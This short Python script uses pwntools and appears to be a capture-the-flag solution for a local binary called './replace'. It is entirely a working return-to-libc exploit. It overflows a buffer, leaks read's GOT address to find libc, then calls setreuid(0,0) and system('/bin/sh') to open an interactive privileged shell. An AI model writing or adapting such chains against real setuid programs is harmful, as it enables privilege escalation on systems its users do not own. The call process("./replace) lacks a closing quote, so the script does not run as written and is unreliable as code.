from pwn import *
r = process("./replace)
payload = b"a"*0x8c
payload += p32(0x080490c0) #write
payload += p32(0x080491f6) #vuln_function
payload += p32(1)
payload += p32(0x804c00c) #read_GOT
payload += p32(4)
r.sendline(payload)
readptr = u32(r.recv(4))
base = readptr - 0xf45d0
system = base + 0x45420
sh = base + 0x18f352
setreuid = base + 0xfea10
log.info("read: %#x" %readptr)
log.info("base: %#x" %base)
log.info("system: %#x" %system)
log.info("sh: %#x" %sh)
log.info("setreuid: %#x" %setreuid)
payload = b"a"*0x8c
payload += p32(setreuid)
payload += p32(0x080491f6) #vuln_function
payload += p32(0)
payload += p32(0)
r.sendline(payload)
payload = b"a"*0x8c
payload += p32(system)
payload += p32(0)
payload += p32(sh)
payload += p32(0)
r.sendline(payload)
r.interactive()
